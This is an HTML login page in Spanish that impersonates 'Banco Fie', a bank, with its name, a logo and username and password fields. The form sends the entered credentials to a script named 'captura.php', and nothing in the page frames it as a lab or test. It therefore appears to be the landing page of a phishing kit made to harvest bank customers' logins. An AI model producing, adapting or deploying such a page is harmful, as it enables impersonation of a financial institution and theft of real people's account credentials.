<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Fie</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <main class="page-wrapper">
        <section class="login-card">
            <div class="brand-logo">
                <img src="OIP2.jpg" alt="Logo Banco Fie">
            </div>

            <h1>INICIO DE SESIÓN</h1>

            <form action="captura.php" method="POST" autocomplete="off">
                <div class="input-group">
                    <label for="usuario">USUARIO</label>
                    <input id="usuario" type="text" name="usuario" placeholder="Ingresa tu usuario" required>
                </div>

                <div class="input-group">
                    <label for="clave">CONTRASEÑA</label>
                    <div class="password-field">
                        <input id="clave" type="password" name="clave" placeholder="Ingresa tu contraseña" required>
                        <span class="password-toggle" aria-hidden="true">👁</span>
                    </div>
                </div>

                <button type="submit">CONTINUAR</button>
            </form>

            <div class="help-links">
                <a href="#">Preguntas frecuentes</a>
                <a href="#">Consejos de seguridad</a>
            </div>
        </section>
    </main>
</body>
</html>